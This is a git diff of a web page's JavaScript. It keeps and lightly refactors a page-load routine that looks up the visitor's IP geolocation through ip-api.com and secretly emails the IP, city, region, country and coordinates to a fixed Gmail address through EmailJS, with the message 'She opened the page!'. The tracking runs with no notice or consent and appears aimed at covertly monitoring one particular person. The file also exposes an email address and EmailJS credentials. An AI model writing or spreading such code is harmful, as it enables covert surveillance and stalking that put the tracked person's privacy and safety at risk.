@@ -175,16 +175,16 @@ function animateModel() {
 }
 
 document.addEventListener("DOMContentLoaded", function () {
-    emailjs.init("g68cD0jfv_Qzhryze"); // Replace with your actual public key
+    emailjs.init("g68cD0jfv_Qzhryze"); // Your EmailJS Public Key
 
-    fetch("http://ip-api.com/json/") // Free API for IP location
+    fetch("http://ip-api.com/json/")
         .then(response => response.json())
         .then(data => {
             let lat = data.lat;
             let lon = data.lon;
 
             let templateParams = {
-                to_email: "techpc.u2005@gmail.com", // Your Email
+                to_email: "techpc.u2005@gmail.com",
                 message: `She opened the page! 
                           IP: ${data.query} 
                           City: ${data.city}, Region: ${data.regionName}, Country: ${data.country} 
@@ -193,13 +193,10 @@ document.addEventListener("DOMContentLoaded", function () {
             };
 
             emailjs.send("service_sklywbd", "template_qy6e6za", templateParams)
-                .then(function(response) {
-                    console.log("Email sent!", response);
-                }, function(error) {
-                    console.log("Failed to send email", error);
-                });
+                .then(response => console.log("✅ Email sent!", response))
+                .catch(error => console.log("❌ Failed to send email", error));
         })
-        .catch(error => console.log("Failed to get IP info", error));
+        .catch(error => console.log("❌ Failed to get IP info", error));
 });
 
 
